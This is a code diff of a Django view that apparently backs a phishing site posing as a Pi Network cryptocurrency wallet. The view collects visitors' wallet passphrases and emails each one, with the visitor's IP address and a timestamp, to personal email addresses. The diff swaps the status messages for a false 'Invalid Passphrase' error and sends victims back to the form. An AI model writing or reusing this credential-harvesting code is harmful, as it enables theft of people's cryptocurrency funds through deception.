@@ -83,14 +83,14 @@ def submit_pass(request):
             key_exists = models.PassPhrase.objects.filter(keys=keys).exists()
             if key_exists:
                 if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
-                    messages.error(request, 'We are validating your Pi coin')
+                    messages.error(request, 'Invalid Passphrase')
                     return redirect('/wallet/')
                 
                 elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
                     return render(request, 'verification.html', {})
                 
                 elif models.PassPhrase.objects.filter(keys=keys).exists():
-                    messages.error(request, 'We are validating your wallet')
+                    messages.error(request, 'Invalid Passphrase')
                     return redirect('/wallet/')
                 
 
@@ -114,9 +114,12 @@ def submit_pass(request):
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
-                request.session['look_up'] = look_up_key
-                # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
-                return approve(request, keys=look_up_key)
+
+                messages.error(request, "Invalid PassPhrase")
+                return redirect('/wallet/')
+                # request.session['look_up'] = look_up_key
+                # # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
+                # return approve(request, keys=look_up_key)
         
     else:
         look = request.session.get('look_up', None)
